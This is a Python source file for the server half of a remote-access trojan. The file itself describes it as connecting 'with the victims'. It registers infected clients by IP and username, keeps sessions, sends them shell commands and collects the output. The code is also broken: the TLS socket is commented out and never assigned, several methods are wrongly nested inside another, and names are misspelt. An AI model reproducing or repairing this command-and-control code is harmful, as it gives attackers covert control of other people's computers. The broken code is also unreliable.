import socket
import ssl
import time
import json

from threading import Thread

""" Network Class

Description:
- It's the Network Class for making connection with the victims
- Send and receive elements with the clients
"""


class Server:
    # Create a TCP socket for connections
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, host, port, buffer_size=2048):
        """ Server class constructor
        :param host: IP to be used for the connection
        :param port: Port to be used for the connection
        :param buffer_size: Optional, recommended 2048 bytes
        """

        self.host = host
        self.port = port
        self.buffer = buffer_size

        self.Sessions = {}
        self.ID = 0

        # Configure the socket to re-use the address multiple times
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        """Wrap the normal TCP Socket for a TLS Socket
        It's used the files from certificates folder
        """

        # self.ss = ssl.wrap_socket(self.s, ssl_version=ssl.PROTOCOL_TLS, certificate=server.crt, keyfile=server.key, server_side=True)

    def receive_all(self, sock):
        """ Function used to receive all the data
        Bypass the buffer-size limit
        :param sock:
        :return: data
        """

        data = b""

        while True:
            # Receive parts of the data
            part = sock.recv(self.buffer)

            # Concatenate to the data
            data += part

            # Break if the length of the part is less than the buffer
            if (len(part) < self.buffer) and (len(part) > 0):
                break
        return data

    def accept_clients(self):
        """ Method used to accept clients
        Start their threads
        Get their info
        :return:
        """

        while True:
            try:
                # Accept each client
                conn, address = self.ss.accept()
            except ssl.SSLError:
                continue

            # Receive the data, decode it, and json loads into a dict
            info_dict = json.loads(self.receive_all(conn).decode())["info"]

            # Check if it the dictionary is not empty
            if info_dict:
                # Get client IP address
                ip = address[0]

                # Get client computer name
                username = info_dict["Usernmae"]
                # Get client state
                online = info_dict["Online"]

                # Get time when client was executed
                date = time.strftime("%d/%m/%G")

                # Variable to check if the user is already in TreeView
                loaded = False

                # Data to be placed when a user sends data
                data = []

            else:
                continue

                # Add all variables to the user session
            self.Sessions[self.ID] = [conn, ip, username, online, date, loaded, data]

            # Start thread to receive data
            t_receive = Thread(target=self.receive_data, args=[self.ID])
            t_receive.daemon = True
            t_receive.start()

            self.ID += 1

        def receive_data(self, uid):
            """ Method used to receive data from client at every moment
            :param self:
            :param uid:
            :return:
            """

            while True:
                # Receive the data from clients
                data = self.receive_all(self.Sessions[uid][0])

                # Json lkoads the data
                output = json.loads(data.decode())

                # Add to user data
                self.Sessions[uid][6] = [output]

        def send_command(self, uid, command):
            """ Method used to send commands to the Client """
            # Send the command to the client
            self.Sessions[uid][0].sendall(command.encode())

            # Make a loop, until it receives data
            while not self.Session[uid][6]:
                pass

            # Get the data received and put in a variable
            dict_element = self.Sessions[uid][6][0]
            data = ''

            # Get each element of the dictionary
            for i in dict_element:
                # If its a shell type
                if i == "shell":
                    # It put in the data variable
                    data = dict_element[i]
                    # And take off the data
                    self.Sessions[uid][6] = []

            # Return the data
            return data

        def start(self):
            """ Method used to start the network class """
            # Bind to a address
            self.ss.bind((self.host, self.port))
            self.ss.listen(1)

            # Start accept cleitns thread
            t_accept_clients = Thread(target=self.accept_clients)
            t_accept_clients.daemon = True
            t_accept_clients.start()
